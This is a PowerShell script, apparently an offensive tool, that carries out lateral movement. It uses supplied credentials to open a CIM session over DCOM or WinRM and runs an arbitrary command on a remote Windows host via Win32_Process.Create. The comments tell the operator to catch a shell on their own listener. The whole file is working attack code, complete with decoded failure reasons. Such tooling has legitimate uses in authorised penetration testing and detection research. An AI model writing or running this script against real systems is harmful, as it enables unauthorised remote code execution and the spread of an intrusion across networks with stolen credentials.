# invoke_cmd.ps1 - CIM/DCOM lateral movement via Win32_Process.Create
# Usage: .\invoke_cmd.ps1 -Target <ip> -Username <user> -Password '<pass>' -Command '<cmd>'
#        add -Protocol Wsman to use WinRM instead of DCOM (default)
# Fire-and-forget: spawns the process as <user>, no output returns - catch the shell on your listener.

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)] [string] $Target,
    [Parameter(Mandatory = $true)] [string] $Username,
    [Parameter(Mandatory = $true)] [string] $Password,
    [Parameter(Mandatory = $true)] [string] $Command,
    [ValidateSet('DCOM', 'Wsman')] [string] $Protocol = 'DCOM'
)

# Win32_Process.Create return codes - decode the common ones so a non-zero
# result tells you WHY rather than leaving you guessing.
$ReturnCodes = @{
    0  = 'Success - process spawned'
    2  = 'Access denied (creds are not admin on the target?)'
    3  = 'Insufficient privilege'
    8  = 'Unknown failure'
    9  = 'Path not found'
    21 = 'Invalid parameter'
}

$Session = $null
try {
    Write-Host "[*] Building credential object for $Username..." -ForegroundColor Cyan
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)

    Write-Host "[*] Creating CIM session option ($Protocol)..." -ForegroundColor Cyan
    $Options = New-CimSessionOption -Protocol $Protocol

    Write-Host "[*] Connecting to $Target..." -ForegroundColor Cyan
    $Session = New-CimSession -ComputerName $Target -Credential $Credential -SessionOption $Options -ErrorAction Stop
    Write-Host "[+] CIM session established." -ForegroundColor Green

    Write-Host "[*] Invoking Win32_Process.Create..." -ForegroundColor Cyan
    $Result = Invoke-CimMethod `
        -CimSession $Session `
        -ClassName Win32_Process `
        -MethodName Create `
        -Arguments @{ CommandLine = $Command } `
        -ErrorAction Stop

    $rv = [int]$Result.ReturnValue
    $meaning = if ($ReturnCodes.ContainsKey($rv)) { $ReturnCodes[$rv] } else { 'Undocumented code' }

    if ($rv -eq 0) {
        Write-Host "[+] Process spawned. PID: $($Result.ProcessId)" -ForegroundColor Green
        Write-Host "[!] NOTE: output does NOT return here - check your listener for the shell." -ForegroundColor Yellow
    }
    else {
        Write-Host "[!] Create returned $rv - $meaning" -ForegroundColor Red
        Write-Host "[!] No process was spawned." -ForegroundColor Red
    }
}
catch {
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    if ($Session) {
        Remove-CimSession -CimSession $Session
        Write-Host "[*] CIM session closed." -ForegroundColor DarkGray
    }
}
